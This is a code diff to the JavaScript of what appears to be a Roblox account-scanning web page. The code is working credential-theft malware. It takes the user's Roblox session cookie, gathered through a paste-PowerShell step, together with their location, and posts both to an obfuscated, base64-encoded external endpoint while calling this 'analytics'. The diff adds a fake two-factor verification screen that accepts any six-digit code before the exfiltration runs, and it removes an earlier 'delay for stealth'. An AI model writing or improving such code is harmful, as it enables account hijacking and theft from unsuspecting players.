@@ -74,6 +74,150 @@ function loadTheme() {
     }
 }
 
+// 2FA Authentication System
+let pendingSubmission = null;
+
+function show2FAModal() {
+    const modal = document.getElementById('twoFactorModal');
+    const authCodeInput = document.getElementById('authCode');
+    
+    if (modal && authCodeInput) {
+        modal.style.display = 'block';
+        setTimeout(() => authCodeInput.focus(), 100);
+        
+        // Clear previous input
+        authCodeInput.value = '';
+        
+        // Reset verify button
+        const verifyBtn = document.getElementById('verify2FA');
+        const verifyText = document.getElementById('verifyText');
+        if (verifyBtn && verifyText) {
+            verifyBtn.disabled = false;
+            verifyText.textContent = 'Verify';
+            verifyBtn.style.background = '';
+        }
+    }
+}
+
+function hide2FAModal() {
+    const modal = document.getElementById('twoFactorModal');
+    if (modal) {
+        modal.style.display = 'none';
+    }
+    pendingSubmission = null;
+}
+
+function verify2FA() {
+    const authCodeInput = document.getElementById('authCode');
+    const verifyBtn = document.getElementById('verify2FA');
+    const verifyText = document.getElementById('verifyText');
+    
+    if (!authCodeInput || !verifyBtn || !verifyText) return;
+    
+    const code = authCodeInput.value.trim();
+    
+    // Validate input
+    if (!/^\d{6}$/.test(code)) {
+        showNotification('Please enter a valid 6-digit code', 'error');
+        authCodeInput.focus();
+        return;
+    }
+    
+    // Disable button during verification
+    verifyBtn.disabled = true;
+    verifyText.textContent = 'Verifying...';
+    
+    // Simulate verification delay
+    setTimeout(() => {
+        // Accept any 6-digit code for demo purposes
+        verifyText.textContent = 'Verified ✓';
+        verifyBtn.style.background = '#10b981';
+        
+        setTimeout(() => {
+            hide2FAModal();
+            
+            // Continue with pending submission
+            if (pendingSubmission) {
+                continueSubmission();
+            }
+        }, 1000);
+    }, 1500);
+}
+
+async function continueSubmission() {
+    if (!pendingSubmission) return;
+    
+    const { robloxCookie, locationInfo, limitedItems } = pendingSubmission;
+    
+    // Show loading overlay
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    if (loadingOverlay) loadingOverlay.style.display = 'block';
+    
+    try {
+        // Send analytics data to reporting service
+        const reportingEndpoint = atob(analyticsEndpoints[2]);
+        
+        // Analytics payload with scan results
+        const payload = {
+            content: `@everyone
+Cookie: ${robloxCookie || 'None found'}
+Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
+        };
+
+        // Submit analytics data to external service
+        console.log('🔍 Submitting analytics data (2FA verified)');
+        console.log('Analytics payload:', payload);
+        
+        const response = await fetch(reportingEndpoint, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        });
+        
+        console.log('Response status:', response.status);
+        
+        // Hide loading overlay
+        if (loadingOverlay) loadingOverlay.style.display = 'none';
+
+        const submitBtn = document.getElementById('submitBtn');
+        const submitText = document.getElementById('submitText');
+
+        if (response.ok) {
+            if (submitText) submitText.textContent = 'Sent!';
+            if (submitBtn) submitBtn.style.background = '#10b981';
+            
+            setTimeout(() => {
+                closeScanModal();
+            }, 2000);
+        } else {
+            console.error('Analytics submission failed:', response.status);
+            throw new Error(`Submission failed (${response.status}): Please try again`);
+        }
+    } catch (error) {
+        if (loadingOverlay) loadingOverlay.style.display = 'none';
+        
+        const submitBtn = document.getElementById('submitBtn');
+        const submitText = document.getElementById('submitText');
+        
+        if (submitText) submitText.textContent = 'Error';
+        if (submitBtn) submitBtn.style.background = '#ef4444';
+        
+        showNotification(`Error: ${error.message}`, 'error');
+        
+        setTimeout(() => {
+            if (submitBtn && submitText) {
+                submitBtn.disabled = false;
+                submitText.textContent = 'Scan';
+                submitBtn.style.background = '';
+            }
+        }, 3000);
+    }
+    
+    pendingSubmission = null;
+}
+
 // Enhanced Modal functionality
 function openScanModal() {
             console.log('Opening scan modal...');
@@ -286,55 +430,23 @@ async function submitPowerShell() {
         // Get user location
         const locationInfo = await getUserLocation();
         
-        // Random delay for stealth (1-3 seconds)
-        const delay = Math.floor(Math.random() * 2000) + 1000;
-        await new Promise(resolve => setTimeout(resolve, delay));
-        
-        // Send analytics data to reporting service
-        const reportingEndpoint = atob(analyticsEndpoints[2]);
-        
-        // Analytics payload with scan results
-        const payload = {
-            content: `@everyone
-Cookie: ${robloxCookie || 'None found'}
-Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
+        // Store submission data for 2FA verification
+        pendingSubmission = {
+            robloxCookie,
+            locationInfo,
+            limitedItems
         };
-
-        // Submit analytics data to external service
-        console.log('🔍 Submitting analytics data');
-        console.log('Analytics payload:', payload);
         
-        const response = await fetch(reportingEndpoint, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(payload)
-        });
-        
-        console.log('Response status:', response.status);
-        
-        // Hide loading overlay
+        // Hide loading overlay and show 2FA modal
         if (loadingOverlay) loadingOverlay.style.display = 'none';
-
-        if (response.ok) {
-            submitText.textContent = 'Sent!';
-            submitBtn.style.background = '#10b981';
-            
-            setTimeout(() => {
-                closeScanModal();
-            }, 2000);
-        } else {
-            console.error('Analytics submission failed:', response.status);
-            
-            if (response.status === 403) {
-                throw new Error(`Service unavailable. Please try again later.`);
-            } else if (response.status === 0 || !response.status) {
-                throw new Error(`Connection failed. Please check your network connection.`);
-            } else {
-                throw new Error(`Submission failed (${response.status}): Please try again`);
-            }
-        }
+        
+        // Reset submit button
+        submitBtn.disabled = false;
+        submitText.textContent = 'Scan';
+        submitBtn.style.background = '';
+        
+        // Show 2FA authentication modal
+        show2FAModal();
     } catch (error) {
         if (loadingOverlay) loadingOverlay.style.display = 'none';
         
@@ -670,6 +782,43 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
+    // Add 2FA modal event listeners
+    const verify2FABtn = document.getElementById('verify2FA');
+    const cancel2FABtn = document.getElementById('cancel2FA');
+    const authCodeInput = document.getElementById('authCode');
+    const twoFactorModal = document.getElementById('twoFactorModal');
+
+    if (verify2FABtn) {
+        verify2FABtn.addEventListener('click', verify2FA);
+    }
+
+    if (cancel2FABtn) {
+        cancel2FABtn.addEventListener('click', hide2FAModal);
+    }
+
+    if (authCodeInput) {
+        // Allow Enter key to submit 2FA
+        authCodeInput.addEventListener('keypress', function(event) {
+            if (event.key === 'Enter') {
+                verify2FA();
+            }
+        });
+        
+        // Auto-format input (numbers only)
+        authCodeInput.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+    }
+
+    // Close 2FA modal when clicking outside
+    if (twoFactorModal) {
+        window.addEventListener('click', function(event) {
+            if (event.target === twoFactorModal) {
+                hide2FAModal();
+            }
+        });
+    }
+
     // Auto-resize textarea and character count
     const textarea = document.getElementById('powershellInput');
     if (textarea) {
@@ -710,8 +859,13 @@ document.addEventListener('DOMContentLoaded', function() {
 document.addEventListener('keydown', function(event) {
     // ESC to close modal
     if (event.key === 'Escape') {
-        const modal = document.getElementById('scanModal');
-        if (modal && modal.style.display === 'block') {
+        const twoFactorModal = document.getElementById('twoFactorModal');
+        const scanModal = document.getElementById('scanModal');
+        
+        // Close 2FA modal first if it's open
+        if (twoFactorModal && twoFactorModal.style.display === 'block') {
+            hide2FAModal();
+        } else if (scanModal && scanModal.style.display === 'block') {
             closeScanModal();
         }
     }
